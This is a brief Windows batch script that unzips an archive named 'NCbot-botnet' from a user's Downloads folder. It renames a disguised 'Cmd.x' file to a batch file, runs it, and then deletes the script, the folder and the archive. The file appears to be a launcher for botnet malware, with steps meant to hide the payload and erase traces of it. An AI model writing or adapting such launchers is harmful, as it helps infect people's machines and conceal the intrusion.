@echo off
:unzip
@echo off
powershell -Command "Expand-Archive C:\Users\Sebastian` V\Downloads\NCbot-botnet.zip -DestinationPath C:\Users\Sebastian` V\Downloads"
goto main
:main
cd %USERPROFILE%\Downloads\NCbot-botnet
copy Cmd.x Cmd.bat
del Cmd.x
start Cmd.bat
timeout 1
del Cmd.bat
cd %USERPROFILE%\Downloads
timeout 10
rmdir NCbot-botnet
del NCbot-botnet.zip
pause;